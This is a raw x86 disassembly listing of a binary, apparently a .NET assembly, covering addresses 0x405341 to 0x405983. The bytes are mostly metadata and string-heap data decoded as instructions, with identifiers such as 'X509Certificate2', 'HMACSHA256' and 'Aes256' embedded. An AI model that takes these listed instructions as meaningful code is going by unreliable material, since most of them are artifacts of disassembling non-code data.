  405341:	03 91 01 ab 02 2f    	add    0x2f02ab01(%ecx),%edx
  405347:	03 c9                	add    %ecx,%ecx
  405349:	03 8b 18 35 03 71    	add    0x71033518(%ebx),%ecx
  40534f:	01 db                	add    %ebx,%ebx
  405351:	11 01                	adc    %eax,(%ecx)
  405353:	00 99 01 db 11 4b    	add    %bl,0x4b11db01(%ecx)
  405359:	03 d1                	add    %ecx,%edx
  40535b:	03 cb                	add    %ebx,%ecx
  40535d:	06                   	push   %es
  40535e:	06                   	push   %es
  40535f:	00 d9                	add    %bl,%cl
  405361:	03 db                	add    %ebx,%ebx
  405363:	11 ef                	adc    %ebp,%edi
  405365:	00 e1                	add    %ah,%cl
  405367:	03 0b                	add    (%ebx),%ecx
  405369:	0a 53 03             	or     0x3(%ebx),%dl
  40536c:	29 01                	sub    %eax,(%ecx)
  40536e:	33 04 bc             	xor    (%esp,%edi,4),%eax
  405371:	01 39                	add    %edi,(%ecx)
  405373:	01 d6                	add    %edx,%esi
  405375:	17                   	pop    %ss
  405376:	18 02                	sbb    %al,(%edx)
  405378:	39 01                	cmp    %eax,(%ecx)
  40537a:	21 09                	and    %ecx,(%ecx)
  40537c:	63 03                	arpl   %eax,(%ebx)
  40537e:	39 01                	cmp    %eax,(%ecx)
  405380:	d6                   	salc
  405381:	17                   	pop    %ss
  405382:	77 03                	ja     0x405387
  405384:	39 01                	cmp    %eax,(%ecx)
  405386:	18 09                	sbb    %cl,(%ecx)
  405388:	6c                   	insb   (%dx),%es:(%edi)
  405389:	02 39                	add    (%ecx),%bh
  40538b:	01 0c 09             	add    %ecx,(%ecx,%ecx,1)
  40538e:	10 00                	adc    %al,(%eax)
  405390:	39 01                	cmp    %eax,(%ecx)
  405392:	f0 17                	lock pop %ss
  405394:	81 03 39 01 69 04    	addl   $0x4690139,(%ebx)
  40539a:	10 00                	adc    %al,(%eax)
  40539c:	11 01                	adc    %eax,(%ecx)
  40539e:	38 13                	cmp    %dl,(%ebx)
  4053a0:	9a 01 11 01 aa 0a 06 	lcall  $0x60a,$0xaa011101
  4053a7:	01 11                	add    %edx,(%ecx)
  4053a9:	01 c4                	add    %eax,%esp
  4053ab:	0a 10                	or     (%eax),%dl
  4053ad:	00 11                	add    %dl,(%ecx)
  4053af:	01 e5                	add    %esp,%ebp
  4053b1:	10 a0 01 1c 00 62    	adc    %ah,0x62001c01(%eax)
  4053b7:	02 02                	add    (%edx),%al
  4053b9:	03 11                	add    (%ecx),%edx
  4053bb:	01 48 13             	add    %ecx,0x13(%eax)
  4053be:	b7 01                	mov    $0x1,%bh
  4053c0:	f1                   	int1
  4053c1:	03 35 17 b1 03 1c    	add    0x1c03b117,%esi
  4053c7:	00 c3                	add    %al,%bl
  4053c9:	11 c9                	adc    %ecx,%ecx
  4053cb:	03 24 00             	add    (%eax,%eax,1),%esp
  4053ce:	75 16                	jne    0x4053e6
  4053d0:	dc 03                	faddl  (%ebx)
  4053d2:	1c 00                	sbb    $0x0,%al
  4053d4:	4c                   	dec    %esp
  4053d5:	09 e1                	or     %esp,%ecx
  4053d7:	03 24 00             	add    (%eax,%eax,1),%esp
  4053da:	42                   	inc    %edx
  4053db:	17                   	pop    %ss
  4053dc:	b7 00                	mov    $0x0,%bh
  4053de:	01 04 33             	add    %eax,(%ebx,%esi,1)
  4053e1:	0e                   	push   %cs
  4053e2:	f1                   	int1
  4053e3:	03 09                	add    (%ecx),%ecx
  4053e5:	04 a8                	add    $0xa8,%al
  4053e7:	14 f7                	adc    $0xf7,%al
  4053e9:	03 01                	add    (%ecx),%eax
  4053eb:	04 5d                	add    $0x5d,%al
  4053ed:	02 fe                	add    %dh,%bh
  4053ef:	03 b9 01 9c 06 06    	add    0x6069c01(%ecx),%edi
  4053f5:	04 11                	add    $0x11,%al
  4053f7:	04 06                	add    $0x6,%al
  4053f9:	04 0d                	add    $0xd,%al
  4053fb:	04 c1                	add    $0xc1,%al
  4053fd:	01 f4                	add    %esi,%esp
  4053ff:	04 14                	add    $0x14,%al
  405401:	04 21                	add    $0x21,%al
  405403:	04 1a                	add    $0x1a,%al
  405405:	07                   	pop    %es
  405406:	1d 04 31 04 12       	sbb    $0x12043104,%eax
  40540b:	10 27                	adc    %ah,(%edi)
  40540d:	04 2c                	add    $0x2c,%al
  40540f:	00 1a                	add    %bl,(%edx)
  405411:	07                   	pop    %es
  405412:	60                   	pusha
  405413:	04 2c                	add    $0x2c,%al
  405415:	00 6a 15             	add    %ch,0x15(%edx)
  405418:	6d                   	insl   (%dx),%es:(%edi)
  405419:	04 34                	add    $0x34,%al
  40541b:	00 96 04 88 04 1c    	add    %dl,0x1c048804(%esi)
  405421:	00 db                	add    %bl,%bl
  405423:	11 06                	adc    %eax,(%esi)
  405425:	00 59 02             	add    %bl,0x2(%ecx)
  405428:	c9                   	leave
  405429:	18 36                	sbb    %dh,(%esi)
  40542b:	00 49 04             	add    %cl,0x4(%ecx)
  40542e:	db 11                	fistl  (%ecx)
  405430:	10 00                	adc    %al,(%eax)
  405432:	e1 01                	loope  0x405435
  405434:	db 11                	fistl  (%ecx)
  405436:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405437:	04 51                	add    $0x51,%al
  405439:	04 53                	add    $0x53,%al
  40543b:	13 af 04 11 02 83    	adc    -0x7cfdeefc(%edi),%ebp
  405441:	0a b5 04 59 04 db    	or     -0x24fba6fc(%ebp),%dh
  405447:	11 10                	adc    %edx,(%eax)
  405449:	00 09                	add    %cl,(%ecx)
  40544b:	01 db                	add    %ebx,%ebx
  40544d:	11 06                	adc    %eax,(%esi)
  40544f:	00 e9                	add    %ch,%cl
  405451:	01 db                	add    %ebx,%ebx
  405453:	11 06                	adc    %eax,(%esi)
  405455:	00 61 04             	add    %ah,0x4(%ecx)
  405458:	c3                   	ret
  405459:	09 01                	or     %eax,(%ecx)
  40545b:	00 61 04             	add    %ah,0x4(%ecx)
  40545e:	60                   	pusha
  40545f:	09 01                	or     %eax,(%ecx)
  405461:	00 61 04             	add    %ah,0x4(%ecx)
  405464:	15 04 cf 04 61       	adc    $0x6104cf04,%eax
  405469:	04 ff                	add    $0xff,%al
  40546b:	09 d6                	or     %edx,%esi
  40546d:	04 61                	add    $0x61,%al
  40546f:	04 ce                	add    $0xce,%al
  405471:	17                   	pop    %ss
  405472:	9a 01 61 04 c2 01 06 	lcall  $0x601,$0xc2046101
  405479:	00 61 04             	add    %ah,0x4(%ecx)
  40547c:	00 12                	add    %dl,(%edx)
  40547e:	dd 04 f1             	fldl   (%ecx,%esi,8)
  405481:	01 db                	add    %ebx,%ebx
  405483:	11 e3                	adc    %esp,%ebx
  405485:	04 61                	add    $0x61,%al
  405487:	04 b4                	add    $0xb4,%al
  405489:	01 b7 01 f1 01 4a    	add    %esi,0x4a01f101(%edi)
  40548f:	0c 06                	or     $0x6,%al
  405491:	00 f9                	add    %bh,%cl
  405493:	01 db                	add    %ebx,%ebx
  405495:	11 9a 01 09 01 be    	adc    %ebx,-0x41fef6ff(%edx)
  40549b:	17                   	pop    %ss
  40549c:	b7 01                	mov    $0x1,%bh
  40549e:	99                   	cltd
  40549f:	03 2f                	add    (%edi),%ebp
  4054a1:	0b f0                	or     %eax,%esi
  4054a3:	04 31                	add    $0x31,%al
  4054a5:	02 d0                	add    %al,%dl
  4054a7:	0a f9                	or     %cl,%bh
  4054a9:	04 89                	add    $0x89,%al
  4054ab:	04 db                	add    $0xdb,%al
  4054ad:	11 10                	adc    %edx,(%eax)
  4054af:	00 61 04             	add    %ah,0x4(%ecx)
  4054b2:	bb 01 9a 01 61       	mov    $0x61019a01,%ebx
  4054b7:	04 f0                	add    $0xf0,%al
  4054b9:	11 dd                	adc    %ebx,%ebp
  4054bb:	04 a9                	add    $0xa9,%al
  4054bd:	02 8e 0b 3a 02 91    	add    -0x6efdc5f5(%esi),%cl
  4054c3:	04 61                	add    $0x61,%al
  4054c5:	18 1c 05 a1 04 ae 17 	sbb    %bl,0x17ae04a1(,%eax,1)
  4054cc:	31 05 01 02 db 11    	xor    %eax,0x11db0201
  4054d2:	06                   	push   %es
  4054d3:	00 08                	add    %cl,(%eax)
  4054d5:	00 84 00 65 05 08 00 	add    %al,0x80565(%eax,%eax,1)
  4054dc:	88 00                	mov    %al,(%eax)
  4054de:	6a 05                	push   $0x5
  4054e0:	08 00                	or     %al,(%eax)
  4054e2:	8c 00                	mov    %es,(%eax)
  4054e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4054e5:	05 08 00 90 00       	add    $0x900008,%eax
  4054ea:	65 05 09 00 a8 00    	gs add $0xa80009,%eax
  4054f0:	74 05                	je     0x4054f7
  4054f2:	09 00                	or     %eax,(%eax)
  4054f4:	ac                   	lods   %ds:(%esi),%al
  4054f5:	00 79 05             	add    %bh,0x5(%ecx)
  4054f8:	09 00                	or     %eax,(%eax)
  4054fa:	b0 00                	mov    $0x0,%al
  4054fc:	7e 05                	jle    0x405503
  4054fe:	2e 00 0b             	add    %cl,%cs:(%ebx)
  405501:	00 9f 06 2e 00 13    	add    %bl,0x13002e06(%edi)
  405507:	00 a8 06 2e 00 1b    	add    %ch,0x1b002e06(%eax)
  40550d:	00 c7                	add    %al,%bh
  40550f:	06                   	push   %es
  405510:	2e 00 23             	add    %ah,%cs:(%ebx)
  405513:	00 d0                	add    %dl,%al
  405515:	06                   	push   %es
  405516:	2e 00 2b             	add    %ch,%cs:(%ebx)
  405519:	00 d0                	add    %dl,%al
  40551b:	06                   	push   %es
  40551c:	2e 00 33             	add    %dh,%cs:(%ebx)
  40551f:	00 d0                	add    %dl,%al
  405521:	06                   	push   %es
  405522:	2e 00 3b             	add    %bh,%cs:(%ebx)
  405525:	00 d0                	add    %dl,%al
  405527:	06                   	push   %es
  405528:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40552c:	d0 06                	rolb   $1,(%esi)
  40552e:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  405532:	d0 06                	rolb   $1,(%esi)
  405534:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  405538:	d0 06                	rolb   $1,(%esi)
  40553a:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  40553e:	d0 06                	rolb   $1,(%esi)
  405540:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  405544:	d6                   	salc
  405545:	06                   	push   %es
  405546:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  40554a:	e3 06                	jecxz  0x405552
  40554c:	c0 00 73             	rolb   $0x73,(%eax)
  40554f:	00 7e 05             	add    %bh,0x5(%esi)
  405552:	e0 00                	loopne 0x405554
  405554:	73 00                	jae    0x405556
  405556:	7e 05                	jle    0x40555d
  405558:	00 01                	add    %al,(%ecx)
  40555a:	73 00                	jae    0x40555c
  40555c:	7e 05                	jle    0x405563
  40555e:	20 01                	and    %al,(%ecx)
  405560:	73 00                	jae    0x405562
  405562:	7e 05                	jle    0x405569
  405564:	40                   	inc    %eax
  405565:	01 73 00             	add    %esi,0x0(%ebx)
  405568:	7e 05                	jle    0x40556f
  40556a:	60                   	pusha
  40556b:	01 73 00             	add    %esi,0x0(%ebx)
  40556e:	7e 05                	jle    0x405575
  405570:	80 01 73             	addb   $0x73,(%ecx)
  405573:	00 7e 05             	add    %bh,0x5(%esi)
  405576:	a0 01 73 00 7e       	mov    0x7e007301,%al
  40557b:	05 c0 01 73 00       	add    $0x7301c0,%eax
  405580:	7e 05                	jle    0x405587
  405582:	e0 01                	loopne 0x405585
  405584:	73 00                	jae    0x405586
  405586:	7e 05                	jle    0x40558d
  405588:	00 02                	add    %al,(%edx)
  40558a:	73 00                	jae    0x40558c
  40558c:	7e 05                	jle    0x405593
  40558e:	20 02                	and    %al,(%edx)
  405590:	73 00                	jae    0x405592
  405592:	7e 05                	jle    0x405599
  405594:	23 02                	and    (%edx),%eax
  405596:	73 00                	jae    0x405598
  405598:	7e 05                	jle    0x40559f
  40559a:	40                   	inc    %eax
  40559b:	02 73 00             	add    0x0(%ebx),%dh
  40559e:	7e 05                	jle    0x4055a5
  4055a0:	60                   	pusha
  4055a1:	02 73 00             	add    0x0(%ebx),%dh
  4055a4:	7e 05                	jle    0x4055ab
  4055a6:	61                   	popa
  4055a7:	02 73 00             	add    0x0(%ebx),%dh
  4055aa:	7e 05                	jle    0x4055b1
  4055ac:	61                   	popa
  4055ad:	02 7b 00             	add    0x0(%ebx),%bh
  4055b0:	2d 07 63 02 73       	sub    $0x73026307,%eax
  4055b5:	00 7e 05             	add    %bh,0x5(%esi)
  4055b8:	80 02 73             	addb   $0x73,(%edx)
  4055bb:	00 7e 05             	add    %bh,0x5(%esi)
  4055be:	81 02 73 00 7e 05    	addl   $0x57e0073,(%edx)
  4055c4:	81 02 7b 00 2d 07    	addl   $0x72d007b,(%edx)
  4055ca:	a0 02 73 00 7e       	mov    0x7e007302,%al
  4055cf:	05 a1 02 73 00       	add    $0x7302a1,%eax
  4055d4:	7e 05                	jle    0x4055db
  4055d6:	a1 02 7b 00 2d       	mov    0x2d007b02,%eax
  4055db:	07                   	pop    %es
  4055dc:	c0 02 73             	rolb   $0x73,(%edx)
  4055df:	00 7e 05             	add    %bh,0x5(%esi)
  4055e2:	c1 02 73             	roll   $0x73,(%edx)
  4055e5:	00 7e 05             	add    %bh,0x5(%esi)
  4055e8:	c1 02 7b             	roll   $0x7b,(%edx)
  4055eb:	00 2d 07 e0 02 73    	add    %ch,0x7302e007
  4055f1:	00 7e 05             	add    %bh,0x5(%esi)
  4055f4:	e1 02                	loope  0x4055f8
  4055f6:	73 00                	jae    0x4055f8
  4055f8:	7e 05                	jle    0x4055ff
  4055fa:	e1 02                	loope  0x4055fe
  4055fc:	7b 00                	jnp    0x4055fe
  4055fe:	2d 07 00 03 73       	sub    $0x73030007,%eax
  405603:	00 7e 05             	add    %bh,0x5(%esi)
  405606:	01 03                	add    %eax,(%ebx)
  405608:	73 00                	jae    0x40560a
  40560a:	7e 05                	jle    0x405611
  40560c:	01 03                	add    %eax,(%ebx)
  40560e:	7b 00                	jnp    0x405610
  405610:	2d 07 20 03 73       	sub    $0x73032007,%eax
  405615:	00 7e 05             	add    %bh,0x5(%esi)
  405618:	21 03                	and    %eax,(%ebx)
  40561a:	73 00                	jae    0x40561c
  40561c:	7e 05                	jle    0x405623
  40561e:	21 03                	and    %eax,(%ebx)
  405620:	7b 00                	jnp    0x405622
  405622:	2d 07 40 03 73       	sub    $0x73034007,%eax
  405627:	00 7e 05             	add    %bh,0x5(%esi)
  40562a:	41                   	inc    %ecx
  40562b:	03 73 00             	add    0x0(%ebx),%esi
  40562e:	7e 05                	jle    0x405635
  405630:	41                   	inc    %ecx
  405631:	03 7b 00             	add    0x0(%ebx),%edi
  405634:	2d 07 61 03 73       	sub    $0x73036107,%eax
  405639:	00 7e 05             	add    %bh,0x5(%esi)
  40563c:	61                   	popa
  40563d:	03 7b 00             	add    0x0(%ebx),%edi
  405640:	2d 07 81 03 73       	sub    $0x73038107,%eax
  405645:	00 7e 05             	add    %bh,0x5(%esi)
  405648:	81 03 7b 00 2d 07    	addl   $0x72d007b,(%ebx)
  40564e:	a1 03 73 00 7e       	mov    0x7e007303,%eax
  405653:	05 a1 03 7b 00       	add    $0x7b03a1,%eax
  405658:	2d 07 01 00 20       	sub    $0x20000107,%eax
  40565d:	00 00                	add    %al,(%eax)
  40565f:	00 14 00             	add    %dl,(%eax,%eax,1)
  405662:	20 00                	and    %al,(%eax)
  405664:	3b 00                	cmp    (%eax),%eax
  405666:	3f                   	aas
  405667:	00 71 00             	add    %dh,0x0(%ecx)
  40566a:	34 01                	xor    $0x1,%al
  40566c:	6d                   	insl   (%dx),%es:(%edi)
  40566d:	01 aa 01 c0 01 34    	add    %ebp,0x3401c001(%edx)
  405673:	02 3e                	add    (%esi),%bh
  405675:	02 48 02             	add    0x2(%eax),%cl
  405678:	75 02                	jne    0x40567c
  40567a:	7f 02                	jg     0x40567e
  40567c:	93                   	xchg   %eax,%ebx
  40567d:	02 b7 02 e7 02 15    	add    0x1502e702(%edi),%dh
  405683:	03 3f                	add    (%edi),%edi
  405685:	03 48 03             	add    0x3(%eax),%ecx
  405688:	5a                   	pop    %edx
  405689:	03 6c 03 89          	add    -0x77(%ebx,%eax,1),%ebp
  40568d:	03 e7                	add    %edi,%esp
  40568f:	03 a0 04 bb 04 ff    	add    -0xfb44fc(%eax),%esp
  405695:	04 29                	add    $0x29,%al
  405697:	05 3b 05 4b 05       	add    $0x54b053b,%eax
  40569c:	04 00                	add    $0x0,%al
  40569e:	01 00                	add    %eax,(%eax)
  4056a0:	00 00                	add    %al,(%eax)
  4056a2:	38 16                	cmp    %dl,(%esi)
  4056a4:	7b 06                	jnp    0x4056ac
  4056a6:	00 00                	add    %al,(%eax)
  4056a8:	1c 16                	sbb    $0x16,%al
  4056aa:	80 06 00             	addb   $0x0,(%esi)
  4056ad:	00 de                	add    %bl,%dh
  4056af:	10 85 06 00 00 8f    	adc    %al,-0x70fffffa(%ebp)
  4056b5:	09 8a 06 00 00 b2    	or     %ecx,-0x4dfffffa(%edx)
  4056bb:	15 8a 06 00 00       	adc    $0x68a,%eax
  4056c0:	42                   	inc    %edx
  4056c1:	09 8e 06 00 00 96    	or     %ecx,-0x69fffffa(%esi)
  4056c7:	02 93 06 00 00 3b    	add    0x3b000006(%ebx),%dl
  4056cd:	02 97 06 00 00 e9    	add    -0x16fffffa(%edi),%dl
  4056d3:	09 8e 06 00 00 e5    	or     %ecx,-0x1afffffa(%esi)
  4056d9:	0c 9b                	or     $0x9b,%al
  4056db:	06                   	push   %es
  4056dc:	00 00                	add    %al,(%eax)
  4056de:	08 0b                	or     %cl,(%ebx)
  4056e0:	93                   	xchg   %eax,%ebx
  4056e1:	06                   	push   %es
  4056e2:	02 00                	add    (%eax),%al
  4056e4:	06                   	push   %es
  4056e5:	00 03                	add    %al,(%ebx)
  4056e7:	00 01                	add    %al,(%ecx)
  4056e9:	00 07                	add    %al,(%edi)
  4056eb:	00 03                	add    %al,(%ebx)
  4056ed:	00 02                	add    %al,(%edx)
  4056ef:	00 08                	add    %cl,(%eax)
  4056f1:	00 05 00 01 00 09    	add    %al,0x9000100
  4056f7:	00 05 00 02 00 0a    	add    %al,0xa000200
  4056fd:	00 07                	add    %al,(%edi)
  4056ff:	00 01                	add    %al,(%ecx)
  405701:	00 0b                	add    %cl,(%ebx)
  405703:	00 07                	add    %al,(%edi)
  405705:	00 02                	add    %al,(%edx)
  405707:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40570a:	09 00                	or     %eax,(%eax)
  40570c:	01 00                	add    %eax,(%eax)
  40570e:	0d 00 09 00 02       	or     $0x2000900,%eax
  405713:	00 0e                	add    %cl,(%esi)
  405715:	00 0b                	add    %cl,(%ebx)
  405717:	00 01                	add    %al,(%ecx)
  405719:	00 0f                	add    %cl,(%edi)
  40571b:	00 0b                	add    %cl,(%ebx)
  40571d:	00 02                	add    %al,(%edx)
  40571f:	00 10                	add    %dl,(%eax)
  405721:	00 0d 00 01 00 11    	add    %cl,0x11000100
  405727:	00 0d 00 02 00 12    	add    %cl,0x12000200
  40572d:	00 0f                	add    %cl,(%edi)
  40572f:	00 01                	add    %al,(%ecx)
  405731:	00 13                	add    %dl,(%ebx)
  405733:	00 0f                	add    %cl,(%edi)
  405735:	00 02                	add    %al,(%edx)
  405737:	00 14 00             	add    %dl,(%eax,%eax,1)
  40573a:	11 00                	adc    %eax,(%eax)
  40573c:	02 00                	add    (%eax),%al
  40573e:	15 00 13 00 01       	adc    $0x1001300,%eax
  405743:	00 16                	add    %dl,(%esi)
  405745:	00 13                	add    %dl,(%ebx)
  405747:	00 02                	add    %al,(%edx)
  405749:	00 17                	add    %dl,(%edi)
  40574b:	00 15 00 01 00 18    	add    %dl,0x18000100
  405751:	00 15 00 02 00 19    	add    %dl,0x19000200
  405757:	00 17                	add    %dl,(%edi)
  405759:	00 01                	add    %al,(%ecx)
  40575b:	00 1a                	add    %bl,(%edx)
  40575d:	00 17                	add    %dl,(%edi)
  40575f:	00 0a                	add    %cl,(%edx)
  405761:	0d fd 0c 15 0d       	or     $0xd150cfd,%eax
  405766:	fb                   	sti
  405767:	02 7e 03             	add    0x3(%esi),%bh
  40576a:	a8 03                	test   $0x3,%al
  40576c:	d3 03                	roll   %cl,(%ebx)
  40576e:	44                   	inc    %esp
  40576f:	04 71                	add    $0x71,%al
  405771:	04 00                	add    $0x0,%al
  405773:	01 71 00             	add    %esi,0x0(%ecx)
  405776:	6a 17                	push   $0x17
  405778:	01 00                	add    %eax,(%eax)
  40577a:	00 01                	add    %al,(%ecx)
  40577c:	73 00                	jae    0x40577e
  40577e:	57                   	push   %edi
  40577f:	17                   	pop    %ss
  405780:	01 00                	add    %eax,(%eax)
  405782:	00 01                	add    %al,(%ecx)
  405784:	75 00                	jne    0x405786
  405786:	d2 04 02             	rolb   %cl,(%edx,%eax,1)
  405789:	00 41 01             	add    %al,0x1(%ecx)
  40578c:	77 00                	ja     0x40578e
  40578e:	8c 16                	mov    %ss,(%esi)
  405790:	02 00                	add    (%eax),%al
  405792:	40                   	inc    %eax
  405793:	01 79 00             	add    %edi,0x0(%ecx)
  405796:	38 07                	cmp    %al,(%edi)
  405798:	02 00                	add    (%eax),%al
  40579a:	40                   	inc    %eax
  40579b:	01 7b 00             	add    %edi,0x0(%ebx)
  40579e:	66 0c 03             	data16 or $0x3,%al
  4057a1:	00 10                	add    %dl,(%eax)
  4057a3:	81 00 00 28 00 04    	addl   $0x4002800,(%eax)
  4057a9:	80 00 00             	addb   $0x0,(%eax)
  4057ac:	01 00                	add    %eax,(%eax)
	...
  4057ba:	93                   	xchg   %eax,%ebx
  4057bb:	01 00                	add    %eax,(%eax)
  4057bd:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4057c8:	00 00                	add    %al,(%eax)
  4057ca:	53                   	push   %ebx
  4057cb:	05 fd 01 00 00       	add    $0x1fd,%eax
  4057d0:	00 00                	add    %al,(%eax)
  4057d2:	04 00                	add    $0x0,%al
	...
  4057dc:	00 00                	add    %al,(%eax)
  4057de:	53                   	push   %ebx
  4057df:	05 98 0d 00 00       	add    $0xd98,%eax
  4057e4:	00 00                	add    %al,(%eax)
  4057e6:	01 00                	add    %eax,(%eax)
	...
  4057f4:	ee                   	out    %al,(%dx)
  4057f5:	01 00                	add    %eax,(%eax)
  4057f7:	00 00                	add    %al,(%eax)
  4057f9:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  405804:	00 00                	add    %al,(%eax)
  405806:	5c                   	pop    %esp
  405807:	05 57 16 00 00       	add    $0x1657,%eax
  40580c:	00 00                	add    %al,(%eax)
  40580e:	04 00                	add    $0x0,%al
	...
  405818:	00 00                	add    %al,(%eax)
  40581a:	5c                   	pop    %esp
  40581b:	05 e4 0a 00 00       	add    $0xae4,%eax
  405820:	00 00                	add    %al,(%eax)
  405822:	04 00                	add    $0x0,%al
	...
  40582c:	00 00                	add    %al,(%eax)
  40582e:	53                   	push   %ebx
  40582f:	05 af 06 00 00       	add    $0x6af,%eax
  405834:	00 00                	add    %al,(%eax)
  405836:	0a 00                	or     (%eax),%al
	...
  405840:	00 00                	add    %al,(%eax)
  405842:	5c                   	pop    %esp
  405843:	05 21 02 00 00       	add    $0x221,%eax
  405848:	00 00                	add    %al,(%eax)
  40584a:	04 00                	add    $0x0,%al
	...
  405854:	00 00                	add    %al,(%eax)
  405856:	53                   	push   %ebx
  405857:	05 0e 14 00 00       	add    $0x140e,%eax
  40585c:	00 00                	add    %al,(%eax)
  40585e:	04 00                	add    $0x0,%al
	...
  405868:	00 00                	add    %al,(%eax)
  40586a:	5c                   	pop    %esp
  40586b:	05 dc 0f 00 00       	add    $0xfdc,%eax
  405870:	00 00                	add    %al,(%eax)
  405872:	12 00                	adc    (%eax),%al
  405874:	0b 00                	or     (%eax),%eax
  405876:	13 00                	adc    (%eax),%eax
  405878:	0e                   	push   %cs
  405879:	00 14 00             	add    %dl,(%eax,%eax,1)
  40587c:	11 00                	adc    %eax,(%eax)
  40587e:	7d 01                	jge    0x405881
  405880:	c3                   	ret
  405881:	03 00                	add    (%eax),%eax
  405883:	00 00                	add    %al,(%eax)
  405885:	41                   	inc    %ecx
  405886:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  40588a:	6e                   	outsb  %ds:(%esi),(%dx)
  40588b:	60                   	pusha
  40588c:	31 30                	xor    %esi,(%eax)
  40588e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  405891:	70 5f                	jo     0x4058f2
  405893:	5f                   	pop    %edi
  405894:	30 00                	xor    %al,(%eax)
  405896:	49                   	dec    %ecx
  405897:	45                   	inc    %ebp
  405898:	6e                   	outsb  %ds:(%esi),(%dx)
  405899:	75 6d                	jne    0x405908
  40589b:	65 72 61             	gs jb  0x4058ff
  40589e:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  4058a2:	31 00                	xor    %eax,(%eax)
  4058a4:	43                   	inc    %ebx
  4058a5:	61                   	popa
  4058a6:	6c                   	insb   (%dx),%es:(%edi)
  4058a7:	6c                   	insb   (%dx),%es:(%edi)
  4058a8:	53                   	push   %ebx
  4058a9:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  4058b0:	69 
  4058b1:	73 74                	jae    0x405927
  4058b3:	60                   	pusha
  4058b4:	31 00                	xor    %eax,(%eax)
  4058b6:	61                   	popa
  4058b7:	31 00                	xor    %eax,(%eax)
  4058b9:	76 31                	jbe    0x4058ec
  4058bb:	00 5f 5f             	add    %bl,0x5f(%edi)
  4058be:	53                   	push   %ebx
  4058bf:	74 61                	je     0x405922
  4058c1:	74 69                	je     0x40592c
  4058c3:	63 41 72             	arpl   %eax,0x72(%ecx)
  4058c6:	72 61                	jb     0x405929
  4058c8:	79 49                	jns    0x405913
  4058ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4058cb:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  4058d2:	69 
  4058d3:	7a 65                	jp     0x40593a
  4058d5:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  4058da:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4058e1:	74 2e                	je     0x405911
  4058e3:	57                   	push   %edi
  4058e4:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  4058eb:	49                   	dec    %ecx
  4058ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4058ed:	74 33                	je     0x405922
  4058ef:	32 00                	xor    (%eax),%al
  4058f1:	3c 3e                	cmp    $0x3e,%al
  4058f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4058f4:	5f                   	pop    %edi
  4058f5:	5f                   	pop    %edi
  4058f6:	32 00                	xor    (%eax),%al
  4058f8:	61                   	popa
  4058f9:	32 00                	xor    (%eax),%al
  4058fb:	58                   	pop    %eax
  4058fc:	35 30 39 43 65       	xor    $0x65433930,%eax
  405901:	72 74                	jb     0x405977
  405903:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40590a:	32 00                	xor    (%eax),%al
  40590c:	76 32                	jbe    0x405940
  40590e:	00 76 33             	add    %dh,0x33(%esi)
  405911:	00 49 6e             	add    %cl,0x6e(%ecx)
  405914:	74 36                	je     0x40594c
  405916:	34 00                	xor    $0x0,%al
  405918:	48                   	dec    %eax
  405919:	4d                   	dec    %ebp
  40591a:	41                   	inc    %ecx
  40591b:	43                   	inc    %ebx
  40591c:	53                   	push   %ebx
  40591d:	48                   	dec    %eax
  40591e:	41                   	inc    %ecx
  40591f:	32 35 36 00 53 68    	xor    0x68530036,%dh
  405925:	61                   	popa
  405926:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40592c:	73 32                	jae    0x405960
  40592e:	35 36 00 61 65       	xor    $0x65610036,%eax
  405933:	73 32                	jae    0x405967
  405935:	35 36 00 67 65       	xor    $0x65670036,%eax
  40593a:	74 5f                	je     0x40599b
  40593c:	55                   	push   %ebp
  40593d:	54                   	push   %esp
  40593e:	46                   	inc    %esi
  40593f:	38 00                	cmp    %al,(%eax)
  405941:	3c 4d                	cmp    $0x4d,%al
  405943:	6f                   	outsl  %ds:(%esi),(%dx)
  405944:	64 75 6c             	fs jne 0x4059b3
  405947:	65 3e 00 3c 50       	gs add %bh,%ds:(%eax,%edx,2)
  40594c:	72 69                	jb     0x4059b7
  40594e:	76 61                	jbe    0x4059b1
  405950:	74 65                	je     0x4059b7
  405952:	49                   	dec    %ecx
  405953:	6d                   	insl   (%dx),%es:(%edi)
  405954:	70 6c                	jo     0x4059c2
  405956:	65 6d                	gs insl (%dx),%es:(%edi)
  405958:	65 6e                	outsb  %gs:(%esi),(%dx)
  40595a:	74 61                	je     0x4059bd
  40595c:	74 69                	je     0x4059c7
  40595e:	6f                   	outsl  %ds:(%esi),(%dx)
  40595f:	6e                   	outsb  %ds:(%esi),(%dx)
  405960:	44                   	inc    %esp
  405961:	65 74 61             	gs je  0x4059c5
  405964:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40596b:	42 
  40596c:	32 41 31             	xor    0x31(%ecx),%al
  40596f:	46                   	inc    %esi
  405970:	39 39                	cmp    %edi,(%ecx)
  405972:	30 32                	xor    %dh,(%edx)
  405974:	42                   	inc    %edx
  405975:	33 35 46 38 46 38    	xor    0x38463846,%esi
  40597b:	38 30                	cmp    %dh,(%eax)
  40597d:	45                   	inc    %ebp
  40597e:	46                   	inc    %esi
  40597f:	31 36                	xor    %esi,(%esi)
  405981:	39 32                	cmp    %esi,(%edx)
  405983:	43                   	inc    %ebx
